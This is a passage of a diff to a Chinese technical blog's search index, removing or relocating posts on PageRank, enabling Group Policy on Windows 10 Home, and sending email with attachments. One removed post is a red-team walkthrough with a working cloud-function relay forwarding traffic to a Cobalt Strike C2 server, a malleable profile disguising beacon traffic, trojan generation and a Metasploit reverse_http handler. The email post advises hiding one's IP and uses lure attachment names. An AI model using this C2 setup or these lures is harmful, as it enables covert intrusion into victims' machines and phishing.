         <tag>安全</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>pagerank_algorithm</title>
-    <url>/pagerank-algorithm/</url>
-    <content><![CDATA[<h1 id="PAGERANK学习笔记"><a href="#PAGERANK学习笔记" class="headerlink" title="PAGERANK学习笔记"></a>PAGERANK学习笔记</h1><h2 id="一、PageRank简介"><a href="#一、PageRank简介" class="headerlink" title="一、PageRank简介"></a>一、PageRank简介</h2><p>​        PageRank(PR)是谷歌搜索用来在搜索引擎中对网站进行排名的算法，<strong>Sergey Brin and Lawrence Page</strong> 发布了一篇论文《<strong>The Anatomy of a Large-Scale Hypertextual Web Search Engine</strong>.》。其中提出PageRank算法，PageRank算法输出一个概率分布，用于表示随机点击链接的人到达任何特定页面的可能性。可以计算任何大小的文档集合的PageRank。PageRank 计算需要通过集合进行多次传递（称为“迭代”），以调整近似的 PageRank 值，以更贴近理论真实值。</p>
-<p>​    在最初的google paper中介绍这个算法的等式是</p>
-<p><img src= "/img/loading.gif" data-lazy-src="../img/document/1/image-20230731123236589.png" alt="image-20230731123236589"></p>
-<blockquote>
-<p>我们假设页面 A 具有页面 T1…Tn 指向它。参数 d 是一个阻尼系数，可以设置为 0 到 1 之间。我们通常将 d 设置为 0.85。此外，C（A）被定义为从页面A流出的链接数量。</p>
-</blockquote>
-<blockquote>
-<p>PageRanks在网页上形成概率分布，因此所有网页的PageRanks的总和将为1。</p>
-</blockquote>
-<blockquote>
-<p>PageRank可以被认为是用户行为的模型。假设有一个“随机冲浪者”，他随机获得一个网页并不断点击链接，从未点击“返回”，但最终感到无聊并从另一个随机页面开始。随机冲浪者访问页面的概率是其PageRank。而且，d阻尼因子是“随机冲浪者”在每个页面上感到无聊并请求另一个随机页面的概率。一个重要的变化是仅将阻尼因子 d 添加到单个页面或一组页面。这允许个性化，并且几乎不可能故意误导系统以获得更高的排名。</p>
-</blockquote>
-<p><img src= "/img/loading.gif" data-lazy-src="../img/document/1/clipboard-1690776602495.png" alt="img"></p>
-<p>图1表示一个有向图，节点A,B,C,D,E,F,H,K表示八个网页，他们的 链接关系如图一箭头所指的方向</p>
-<p>​    入链：从页面流出的链接</p>
-<p>​    出链：从页面访问的链接（可以理解为referer)</p>
-<p>​    在图1中，A的出链有两个，入链有一个，所以A的PR值是</p>
-<p><img src= "/img/loading.gif" data-lazy-src="../img/document/1/image-20230731000617948.png" alt="image-20230731000617948"></p>
-<ul>
-<li>如果一个页面被很多高质量（PR值高的）页面指向，则该页面可以具有很高的PageRank</li>
-</ul>
-<h2 id="二、PageRank在计算的过程时会出现几个问题"><a href="#二、PageRank在计算的过程时会出现几个问题" class="headerlink" title="二、PageRank在计算的过程时会出现几个问题"></a>二、PageRank在计算的过程时会出现几个问题</h2><p>•   等级泄露（Rank Leak) 网页只有入链，没有出链( H )  为了避免PR为0 需要赋值</p>
-<p>•   等级沉没（Rank Sink） 网页只有出链没有入链  (F)为了避免PR为0 需要赋值</p>
-<p>•   Spider Traps 网页和其他节点无链接，只有自己指向自己 (k)</p>
-<h2 id="三、PageRank定义"><a href="#三、PageRank定义" class="headerlink" title="三、PageRank定义"></a>三、PageRank定义</h2><p>假定有N个节点，每个节点到任意一个节点几率相等，那么转移的几率是1/N</p>
-<ul>
-<li>一个网页的PR值=所有入链集合的加权PR之和</li>
-</ul>
-<blockquote>
-<p>uri A为评估页面，B{referer1.referer2}是A入链的集合</p>
-<p>PR(A)=d*(PR(referer1)/referer1的所有出链数量+PR(referer2)/referer2的所有出链数量+…)</p>
-</blockquote>
-<h2 id="四、PageRank随机浏览模型"><a href="#四、PageRank随机浏览模型" class="headerlink" title="四、PageRank随机浏览模型"></a>四、PageRank随机浏览模型</h2><p><img src= "/img/loading.gif" data-lazy-src="../img/document/1/wps3.png" alt="img"></p>
-<p>使用迭代法计算Pagerank值【根据图1的范例】</p>
-<p><img src= "/img/loading.gif" data-lazy-src="../img/document/1/image-20230731123311622.png" alt="image-20230731123311622"></p>
-<blockquote>
-<p>将所有节点转换成数字，在将所有入链转换成坐标来得到矩阵</p>
-<p>每行为对应页面的入链  B页面有两个入链D,和E （D和E都有两个出链，那么如果访问关系是按照链接跳转，那么从D和E跳转到B的可能性质都为1/2</p>
-</blockquote>
-<h2 id="五、python完整代码"><a href="#五、python完整代码" class="headerlink" title="五、python完整代码"></a>五、python完整代码</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import numpy as np</span><br><span class="line">import pandas as pd</span><br><span class="line"></span><br><span class="line">p &#x3D; 0.85  # 引入浏览当前网页的概率为p,假设p&#x3D;0.85</span><br><span class="line"></span><br><span class="line">df &#x3D; pd.read_csv(&#39;file&#x2F;1.csv&#39;)</span><br><span class="line">edges &#x3D; [list(edge) for edge in zip(df[&#39;t1&#39;], df[&#39;t2&#39;])]</span><br><span class="line"></span><br><span class="line"># 根据边获取节点的集合</span><br><span class="line">nodes &#x3D; list(set(np.array(edges).flatten()))</span><br><span class="line"></span><br><span class="line">N &#x3D; len(nodes)</span><br><span class="line"># 将字符串，映射成阿拉伯数字</span><br><span class="line">dict_uri &#x3D; dict(enumerate(nodes))</span><br><span class="line">#将字典键值反转  同时获取空值的id</span><br><span class="line">node_to_num&#x3D;&#123;&#125;</span><br><span class="line">num_isnull&#x3D;-1</span><br><span class="line">for key, val in dict_uri.items():</span><br><span class="line">    node_to_num[val]&#x3D;key</span><br><span class="line">    if val&#x3D;&#x3D;&#39;Q&#39;:</span><br><span class="line">        num_isnull&#x3D;key</span><br><span class="line">for edge in edges:</span><br><span class="line">    edge[0] &#x3D; node_to_num[edge[0]]</span><br><span class="line">    edge[1] &#x3D; node_to_num[edge[1]]</span><br><span class="line"># 生成初步的矩阵</span><br><span class="line">a &#x3D; np.zeros([N, N])</span><br><span class="line">for edge in edges:</span><br><span class="line">    a[edge[1], edge[0]] &#x3D; 1</span><br><span class="line"></span><br><span class="line"># 入链，行a[i]里面的元素都是i的入链</span><br><span class="line">length &#x3D; a.shape[1]  # 网页数量</span><br><span class="line"># 构造转移矩阵</span><br><span class="line"># 出链，行a[i]里面的元素都是i的出链</span><br><span class="line">b &#x3D; np.transpose(a)  # b为a的转置矩阵</span><br><span class="line">m &#x3D; np.zeros((a.shape), dtype&#x3D;float)</span><br><span class="line">for i in range(a.shape[0]):</span><br><span class="line">    for j in range(a.shape[1]):</span><br><span class="line">        # 如果一个节点没有任何出链，Dead Ends</span><br><span class="line">        if b[j].sum() &#x3D;&#x3D; 0:</span><br><span class="line">            b[j] &#x3D; b[j] + np.array([1 &#x2F; length] * length)</span><br><span class="line">        m[i][j] &#x3D; a[i][j] &#x2F; (b[j].sum())  # 完成初始化分配</span><br><span class="line"></span><br><span class="line"># pr值得初始化</span><br><span class="line">v &#x3D; np.zeros((m.shape[0], 1), dtype&#x3D;float)  # 构造一个存放pr值得矩阵</span><br><span class="line">for i in range(m.shape[0]):</span><br><span class="line">    v[i] &#x3D; float(1) &#x2F; m.shape[0]</span><br><span class="line"></span><br><span class="line">count &#x3D; 0</span><br><span class="line">ee &#x3D; np.array([[1 &#x2F; length] * length]).reshape(length, -1)</span><br><span class="line"># 循环100次计算pageRank值</span><br><span class="line">for i in range(1000):</span><br><span class="line">    #  解决spider traps问题，spider traps会导致网站权重向一个节点偏移，将转移矩阵加上打开其他网页的概率1-p</span><br><span class="line">    v &#x3D; p * np.dot(m, v) + (1 - p) * ee</span><br><span class="line">    count +&#x3D; 1</span><br><span class="line"># pageRank值</span><br><span class="line"></span><br><span class="line">t &#x3D; 0</span><br><span class="line">info &#x3D; dict()</span><br><span class="line">for i in v:</span><br><span class="line">    info[dict_uri[t]] &#x3D; list(i)[0]</span><br><span class="line">    # info.append(temp)</span><br><span class="line">    t +&#x3D; 1</span><br><span class="line">pagerank_sorted_values &#x3D; sorted(info.items(), key&#x3D;lambda x: x[1], reverse&#x3D;True)</span><br><span class="line">print(pagerank_sorted_values)</span><br><span class="line">all&#x3D;0</span><br><span class="line">for i in pagerank_sorted_values:</span><br><span class="line">    all+&#x3D;list(i)[1]</span><br><span class="line">print(all)</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
-<li><p>《<strong>The Anatomy of a Large-Scale Hypertextual Web Search Engine</strong>.》算法论文：<a href="https://storage.googleapis.com/pub-tools-public-publication-data/pdf/334.pdf">https://storage.googleapis.com/pub-tools-public-publication-data/pdf/334.pdf</a></p>
-</li>
-<li><p>《人工智能自然语言处理—PageRank算法和TextRank算法详解》<a href="https://cloud.tencent.com/developer/article/2261595">https://cloud.tencent.com/developer/article/2261595</a></p>
-</li>
-<li><p>机器学习经典算法之PageRank <a href="https://www.cnblogs.com/jpcflyer/p/11180263.html">https://www.cnblogs.com/jpcflyer/p/11180263.html</a></p>
-</li>
-<li><p>PageRank 算法详解<a href="https://blog.csdn.net/qq_41427834/article/details/110262036">https://blog.csdn.net/qq_41427834/article/details/110262036</a></p>
-</li>
-</ul>
-]]></content>
-      <categories>
-        <category>安全研究</category>
-        <category>数据挖掘算法</category>
-      </categories>
-      <tags>
-        <tag>安全研究</tag>
       </tags>
   </entry>
   <entry>
@@ -618,73 +640,20 @@
       </tags>
   </entry>
   <entry>
-    <title>win10家庭版没有组策略解决方式</title>
-    <url>/win10%E5%AE%B6%E5%BA%AD%E7%89%88%E6%B2%A1%E6%9C%89%E7%BB%84%E7%AD%96%E7%95%A5%E8%A7%A3%E5%86%B3%E6%96%B9%E5%BC%8F/</url>
-    <content><![CDATA[<div class="note primary simple"><h5 id="1-新建一个文件"><a href="#1-新建一个文件" class="headerlink" title="1.新建一个文件"></a>1.新建一个文件</h5></div>
-
-<p><img src= "/img/loading.gif" data-lazy-src="../img%5Cdocument%5Cgpedit%5C118081416313.png" alt="118081416313"></p>
-<div class="note primary simple"><h5 id="2-将代码放入"><a href="#2-将代码放入" class="headerlink" title="2.将代码放入"></a>2.将代码放入</h5></div>
-
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@echo off</span><br><span class="line"></span><br><span class="line">pushd &quot;%~dp0&quot;</span><br><span class="line"></span><br><span class="line">dir &#x2F;b C:\Windows\servicing\Packages\Microsoft-Windows-GroupPolicy-ClientExtensions-Package~3*.mum &gt;List.txt</span><br><span class="line"></span><br><span class="line">dir &#x2F;b C:\Windows\servicing\Packages\Microsoft-Windows-GroupPolicy-ClientTools-Package~3*.mum &gt;&gt;List.txt</span><br><span class="line"></span><br><span class="line">for &#x2F;f %%i in (&#39;findstr &#x2F;i . List.txt 2^&gt;nul&#39;) do dism &#x2F;online &#x2F;norestart &#x2F;add-package:&quot;C:\Windows\servicing\Packages\%%i&quot;</span><br><span class="line"></span><br><span class="line">pause</span><br></pre></td></tr></table></figure>
-
-<p>CTRL+C保存</p>
-<div class="note primary simple"><h5 id="3-将文件扩展名改为-bat"><a href="#3-将文件扩展名改为-bat" class="headerlink" title="3.将文件扩展名改为.bat"></a>3.将文件扩展名改为.bat</h5></div>
-
-<p><img src= "/img/loading.gif" data-lazy-src="../img/document/gpedit/118082125198.png" alt="img"></p>
-<div class="note primary simple"><h5 id="4-右键以管理员身份运行"><a href="#4-右键以管理员身份运行" class="headerlink" title="4.右键以管理员身份运行"></a>4.右键以管理员身份运行</h5></div>
-
-<p><img src= "/img/loading.gif" data-lazy-src="../img/document/gpedit/118082509921.png" alt="img"></p>
-<h5 id="5-将生成的临时文件list-txt删除"><a href="#5-将生成的临时文件list-txt删除" class="headerlink" title="5.将生成的临时文件list.txt删除"></a>5.将生成的临时文件list.txt删除</h5>]]></content>
-      <tags>
-        <tag>window</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>云函数和cs并派生到msf</title>
-    <url>/%E4%BA%91%E5%87%BD%E6%95%B0%E5%92%8Ccs%E5%B9%B6%E6%B4%BE%E7%94%9F%E5%88%B0msf/</url>
-    <content><![CDATA[<h1 id="云函数-amp-CS-amp-MSF"><a href="#云函数-amp-CS-amp-MSF" class="headerlink" title="云函数&amp;CS&amp;MSF"></a>云函数&amp;CS&amp;MSF</h1><h2 id="一、云函数"><a href="#一、云函数" class="headerlink" title="一、云函数"></a>一、云函数</h2><h3 id="1、新建云函数"><a href="#1、新建云函数" class="headerlink" title="1、新建云函数"></a>1、新建云函数</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029101355697-1645092605528.png" alt="image-20211029101355697"></p>
-<h3 id="2、创建自定义模板"><a href="#2、创建自定义模板" class="headerlink" title="2、创建自定义模板"></a>2、创建自定义模板</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029101717459-1645092605528.png" alt="image-20211029101717459"></p>
-<h3 id="3、下滑页面，写入代码"><a href="#3、下滑页面，写入代码" class="headerlink" title="3、下滑页面，写入代码"></a>3、下滑页面，写入代码</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029101943247-1645092605528.png" alt="image-20211029101943247"></p>
-<p>云函数内容</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -*- coding: utf8 -*-</span><br><span class="line">import json</span><br><span class="line">import base64</span><br><span class="line">import socket,time</span><br><span class="line">import requests</span><br><span class="line">def main_handler(event, context):</span><br><span class="line">    c2 &#x3D; &quot;http:&#x2F;&#x2F;服务器ip&quot;</span><br><span class="line">    # event&#x3D;json.dumps(event)</span><br><span class="line">    path &#x3D; event[&#39;path&#39;]</span><br><span class="line">    # # print(path)</span><br><span class="line">    headers &#x3D; event[&#39;headers&#39;]</span><br><span class="line">    ip &#x3D; event[&#39;requestContext&#39;][&#39;sourceIp&#39;]</span><br><span class="line">    # # # # # try:</span><br><span class="line">    headers[&#39;X-Forwarded-For&#39;] &#x3D; ip</span><br><span class="line">   </span><br><span class="line">    if event[&#39;httpMethod&#39;] &#x3D;&#x3D; &#39;GET&#39;:</span><br><span class="line">        resp&#x3D;requests.get(c2+path,headers&#x3D;headers,verify&#x3D;False)</span><br><span class="line">    else:</span><br><span class="line">        resp&#x3D;requests.post(c2+path,data&#x3D;event[&#39;body&#39;],headers&#x3D;headers,verify&#x3D;False)</span><br><span class="line">    response &#x3D; &#123;</span><br><span class="line">        &quot;isBase64Encoded&quot;: True,</span><br><span class="line">        &quot;statusCode&quot;: resp.status_code,</span><br><span class="line">        &quot;headers&quot;: dict(resp.headers),</span><br><span class="line">        &quot;body&quot;: str(base64.b64encode(resp.content))[2:-1]</span><br><span class="line">    &#125;</span><br><span class="line">    return response </span><br><span class="line">#进行测试，返回值error可能存在格式问题。</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="4、创建API触发器"><a href="#4、创建API触发器" class="headerlink" title="4、创建API触发器"></a>4、创建API触发器</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029102153774-1645092605528.png" alt="image-20211029102153774"></p>
-<h3 id="5、修改API参数长度"><a href="#5、修改API参数长度" class="headerlink" title="5、修改API参数长度"></a>5、修改API参数长度</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/1/image-20220217182030297.png" alt="image-20220217182030297"></p>
-<p>修改后发布即可</p>
-<p><img src= "/img/loading.gif" data-lazy-src="../../../user/download/CS/%25E4%25BA%2591%25E5%2587%25BD%25E6%2595%25B0%25E5%2592%258Ccs%25E5%25B9%25B6%25E6%25B4%25BE%25E7%2594%259F%25E5%2588%25B0msf/image-20211029102331066.png" alt="image-20211029102331066"></p>
-<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029102404624-1645092605528.png" alt="image-20211029102404624"></p>
-<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029102748778-1645092605528.png" alt="image-20211029102748778"></p>
-<h3 id="6、查看API"><a href="#6、查看API" class="headerlink" title="6、查看API"></a>6、查看API</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029103023818-1645092605528.png" alt="image-20211029103023818"></p>
-<p><strong>可以使用80和443两个端口</strong></p>
-<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029103133988-1645092605528.png" alt="image-20211029103133988"></p>
-<h2 id="二、Cobalt-Strike"><a href="#二、Cobalt-Strike" class="headerlink" title="二、Cobalt Strike"></a>二、Cobalt Strike</h2><h3 id="1、创建CS配置文件-cs-profile"><a href="#1、创建CS配置文件-cs-profile" class="headerlink" title="1、创建CS配置文件  cs.profile"></a>1、创建CS配置文件  cs.profile</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set sleeptime &quot;5000&quot;;</span><br><span class="line">set jitter    &quot;0&quot;;</span><br><span class="line">set maxdns    &quot;255&quot;;</span><br><span class="line">set useragent &quot;Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko&#x2F;20100101 Firefox&#x2F;80.0&quot;;</span><br><span class="line"></span><br><span class="line">http-config &#123;</span><br><span class="line">        set headers &quot;Server, Content-Type, Cache-Control, Connection, X-Powered-By&quot;;</span><br><span class="line">        header &quot;Server&quot; &quot;Nginx&quot;;</span><br><span class="line">        header &quot;Content-Type&quot; &quot;text&#x2F;html;charset&#x3D;UTF-8&quot;;</span><br><span class="line">        header &quot;Cache-Control&quot; &quot;max-age&#x3D;1&quot;;</span><br><span class="line">        header &quot;Connection&quot; &quot;keep-alive&quot;;</span><br><span class="line">        set trust_x_forwarded_for &quot;true&quot;;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">http-get &#123;</span><br><span class="line"></span><br><span class="line">    set uri &quot;&#x2F;api&#x2F;x&quot;;</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line">        header &quot;Accept&quot; &quot;*&#x2F;*&quot;;</span><br><span class="line">        metadata &#123;</span><br><span class="line">            base64;</span><br><span class="line">            prepend &quot;SESSIONID&#x3D;&quot;;</span><br><span class="line">            header &quot;Cookie&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        header &quot;Content-Type&quot; &quot;application&#x2F;ocsp-response&quot;;</span><br><span class="line">        header &quot;content-transfer-encoding&quot; &quot;binary&quot;;</span><br><span class="line">        header &quot;Server&quot; &quot;nginx&quot;;</span><br><span class="line">        output &#123;</span><br><span class="line">            base64;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">http-stager &#123;  </span><br><span class="line">    set uri_x86 &quot;&#x2F;vue.min.js&quot;;</span><br><span class="line">    set uri_x64 &quot;&#x2F;bootstrap-2.min.js&quot;;</span><br><span class="line">&#125;</span><br><span class="line">http-post &#123;</span><br><span class="line">    set uri &quot;&#x2F;api&#x2F;y&quot;;</span><br><span class="line">    client &#123;</span><br><span class="line">        header &quot;Accept&quot; &quot;*&#x2F;*&quot;;</span><br><span class="line">        id &#123;</span><br><span class="line">            base64;</span><br><span class="line">            prepend &quot;JSESSION&#x3D;&quot;;</span><br><span class="line">            header &quot;Cookie&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        output &#123;</span><br><span class="line">            base64;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        header &quot;Content-Type&quot; &quot;application&#x2F;ocsp-response&quot;;</span><br><span class="line">        header &quot;content-transfer-encoding&quot; &quot;binary&quot;;</span><br><span class="line">        header &quot;Connection&quot; &quot;keep-alive&quot;;</span><br><span class="line">        output &#123;</span><br><span class="line">            base64;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h3 id="2、服务器运行cs服务器"><a href="#2、服务器运行cs服务器" class="headerlink" title="2、服务器运行cs服务器"></a>2、服务器运行cs服务器</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;teamserver  服务器IP[和云函数的一致] 密码 cs.profile</span><br></pre></td></tr></table></figure>
-
-<h3 id="3、攻击机运行cs"><a href="#3、攻击机运行cs" class="headerlink" title="3、攻击机运行cs"></a>3、攻击机运行cs</h3><p>可以写个shell脚本</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -XX:ParallelGCThreads&#x3D;4 -XX:+AggressiveHeap -XX:+UseParallelGC -Xms512M -Xmx1024M -jar cobaltstrike.jar</span><br></pre></td></tr></table></figure>
-
-<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029104901511-1645092605528.png" alt="image-20211029104901511"></p>
-<h3 id="4、创建监听"><a href="#4、创建监听" class="headerlink" title="4、创建监听"></a>4、创建监听</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029111712002-1645092605528.png" alt="image-20211029111712002"></p>
-<h3 id="5、生成木马"><a href="#5、生成木马" class="headerlink" title="5、生成木马"></a>5、生成木马</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029111956739-1645092605529.png" alt="image-20211029111956739"></p>
-<h3 id="6、受害机运行木马"><a href="#6、受害机运行木马" class="headerlink" title="6、受害机运行木马"></a>6、受害机运行木马</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029113321079-1645092605529.png" alt="image-20211029113321079"></p>
-<h3 id="7、成功上线"><a href="#7、成功上线" class="headerlink" title="7、成功上线"></a>7、成功上线</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029113811026-1645092605529.png" alt="image-20211029113811026"></p>
-<h3 id="8、执行命令获取返回值【成功】"><a href="#8、执行命令获取返回值【成功】" class="headerlink" title="8、执行命令获取返回值【成功】"></a>8、执行命令获取返回值【成功】</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029114054919-1645092605529.png" alt="image-20211029114054919"></p>
-<h2 id="三、CS派生MSF"><a href="#三、CS派生MSF" class="headerlink" title="三、CS派生MSF"></a>三、CS派生MSF</h2><h3 id="1、MSF开启监听"><a href="#1、MSF开启监听" class="headerlink" title="1、MSF开启监听"></a>1、MSF开启监听</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set lhost 192.168.223.137[攻击机IP]</span><br><span class="line">set lport 9999</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_http [注意payload要和cs设置的一致]</span><br></pre></td></tr></table></figure>
-
-<h3 id="2、CS创建新的监听器"><a href="#2、CS创建新的监听器" class="headerlink" title="2、CS创建新的监听器"></a>2、CS创建新的监听器</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029114642961-1645092605547.png" alt="image-20211029114642961"></p>
-<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029114755031-1645092605547.png" alt="image-20211029114755031"></p>
-<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029114822858-1645092605548.png" alt="image-20211029114822858"></p>
-<p>失败emmmm</p>
-]]></content>
+    <title>邮件</title>
+    <url>/%E9%82%AE%E4%BB%B6/</url>
+    <content><![CDATA[<h1 id="邮件相关【杂】"><a href="#邮件相关【杂】" class="headerlink" title="邮件相关【杂】"></a>邮件相关【杂】</h1><h2 id="一、内网邮件服务器"><a href="#一、内网邮件服务器" class="headerlink" title="一、内网邮件服务器"></a>一、内网邮件服务器</h2><p>​    第三方软件HMailServer，可以很容易搭建内网邮件服务器 —适用于windows  亲测有效。留存。【很详细】</p>
+<p><a href="https://www.cnblogs.com/tiger-fu/p/7448005.html">https://www.cnblogs.com/tiger-fu/p/7448005.html</a></p>
+<p><a href="https://blog.csdn.net/gelupu/article/details/38325029">https://blog.csdn.net/gelupu/article/details/38325029</a></p>
+<h2 id="二、邮件"><a href="#二、邮件" class="headerlink" title="二、邮件"></a>二、邮件</h2><p>​    建议可以使用云函数发送，可以避免自身的真实IP泄露</p>
+<p>pyhon 发送邮箱【带附件】</p>
+<p>#注意模块的安装</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import smtplib</span><br><span class="line">from email.mime.text import MIMEText</span><br><span class="line">from email.mime.multipart import MIMEMultipart</span><br><span class="line">#输入发件人邮箱名称</span><br><span class="line">email_name &#x3D; &#39;邮箱【建议写自定义邮箱】&#39;</span><br><span class="line"># 输入用户授权码</span><br><span class="line">passwd &#x3D; &#39;授权码 QQ邮箱-账户&#39;</span><br><span class="line"># 收件人邮箱</span><br><span class="line">msg_to &#x3D; &#39;收件人邮箱&#39;</span><br><span class="line"># 邮件的正文</span><br><span class="line">content &#x3D; &quot;测试&quot;</span><br><span class="line"># 设置邮件</span><br><span class="line">msg &#x3D; MIMEText(content)</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">Content-Type: text&#x2F;plain; charset&#x3D;&quot;utf-8&quot;</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Transfer-Encoding: base64 5rWL6K+V</span><br><span class="line"></span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">msg[&#39;subject&#39;]&#x3D;&#39;嗷~&#39;</span><br><span class="line">#设置发件人</span><br><span class="line">msg[&#39;From&#39;]&#x3D; &#39;你隔壁的小王&#39;</span><br><span class="line"># 这个参数设置要发给谁</span><br><span class="line">msg[&#39;To&#39;] &#x3D; msg_to</span><br><span class="line">#添加附件内容</span><br><span class="line">msg.attach(content_part)</span><br><span class="line"></span><br><span class="line">#*********************构造附件***********</span><br><span class="line"># 文本类型的附件</span><br><span class="line">att1 &#x3D; MIMEText(open(&quot;.&#x2F;baidu.doc&quot;,&#39;rb&#39;).read(),&#39;plain&#39;,&#39;utf-8&#39;)</span><br><span class="line"></span><br><span class="line"># 添加头信息，我告诉服务器，我现在是一个附件</span><br><span class="line">att1[&#39;Content-Type&#39;]&#x3D;&#39;application&#x2F;octet-stream&#39;</span><br><span class="line">att1.add_header(&quot;Content-Disposition&quot;,&#39;attachment&#39;,filename&#x3D;(&#39;gbk&#39;,&quot;&quot;,&#39;学习最新信息.txt&#39;))</span><br><span class="line"># 把内容添加到邮件中</span><br><span class="line">msg.attach(att1)</span><br><span class="line"></span><br><span class="line"># 图片附件</span><br><span class="line">att2 &#x3D; MIMEText(open(&quot;.&#x2F;4.png&quot;,&#39;rb&#39;).read(),&#39;plain&#39;,&#39;utf-8&#39;)</span><br><span class="line"></span><br><span class="line"># 添加头信息，我告诉服务器，我现在是一个附件</span><br><span class="line">att2[&#39;Content-Type&#39;]&#x3D;&#39;application&#x2F;octet-stream&#39;</span><br><span class="line">att2.add_header(&quot;Content-Disposition&quot;,&#39;attachment&#39;,filename&#x3D;(&#39;gbk&#39;,&quot;&quot;,&#39;小猪猪.png&#39;))</span><br><span class="line"># 把内容添加到邮件中</span><br><span class="line">msg.attach(att2)</span><br><span class="line">#连接服务器</span><br><span class="line">s&#x3D; smtplib.SMTP_SSL(&#39;smtp.qq.com&#39;,465)</span><br><span class="line"># 登陆我的邮箱</span><br><span class="line">s.login(email_name,passwd)</span><br><span class="line"># 发送邮箱</span><br><span class="line">s.sendmail(email_name,msg_to,msg.as_string())</span><br><span class="line">print(&quot;发送成功&quot;)</span><br></pre></td></tr></table></figure>]]></content>
       <categories>
-        <category>安全</category>
-        <category>Tools</category>
+        <category>邮件</category>
       </categories>
       <tags>
-        <tag>安全</tag>
+        <tag>python</tag>
       </tags>
   </entry>
   <entry>
@@ -739,20 +708,51 @@
       </categories>
   </entry>
   <entry>
-    <title>邮件</title>
-    <url>/%E9%82%AE%E4%BB%B6/</url>
-    <content><![CDATA[<h1 id="邮件相关【杂】"><a href="#邮件相关【杂】" class="headerlink" title="邮件相关【杂】"></a>邮件相关【杂】</h1><h2 id="一、内网邮件服务器"><a href="#一、内网邮件服务器" class="headerlink" title="一、内网邮件服务器"></a>一、内网邮件服务器</h2><p>​    第三方软件HMailServer，可以很容易搭建内网邮件服务器 —适用于windows  亲测有效。留存。【很详细】</p>
-<p><a href="https://www.cnblogs.com/tiger-fu/p/7448005.html">https://www.cnblogs.com/tiger-fu/p/7448005.html</a></p>
-<p><a href="https://blog.csdn.net/gelupu/article/details/38325029">https://blog.csdn.net/gelupu/article/details/38325029</a></p>
-<h2 id="二、邮件"><a href="#二、邮件" class="headerlink" title="二、邮件"></a>二、邮件</h2><p>​    建议可以使用云函数发送，可以避免自身的真实IP泄露</p>
-<p>pyhon 发送邮箱【带附件】</p>
-<p>#注意模块的安装</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import smtplib</span><br><span class="line">from email.mime.text import MIMEText</span><br><span class="line">from email.mime.multipart import MIMEMultipart</span><br><span class="line">#输入发件人邮箱名称</span><br><span class="line">email_name &#x3D; &#39;邮箱【建议写自定义邮箱】&#39;</span><br><span class="line"># 输入用户授权码</span><br><span class="line">passwd &#x3D; &#39;授权码 QQ邮箱-账户&#39;</span><br><span class="line"># 收件人邮箱</span><br><span class="line">msg_to &#x3D; &#39;收件人邮箱&#39;</span><br><span class="line"># 邮件的正文</span><br><span class="line">content &#x3D; &quot;测试&quot;</span><br><span class="line"># 设置邮件</span><br><span class="line">msg &#x3D; MIMEText(content)</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">Content-Type: text&#x2F;plain; charset&#x3D;&quot;utf-8&quot;</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Transfer-Encoding: base64 5rWL6K+V</span><br><span class="line"></span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">msg[&#39;subject&#39;]&#x3D;&#39;嗷~&#39;</span><br><span class="line">#设置发件人</span><br><span class="line">msg[&#39;From&#39;]&#x3D; &#39;你隔壁的小王&#39;</span><br><span class="line"># 这个参数设置要发给谁</span><br><span 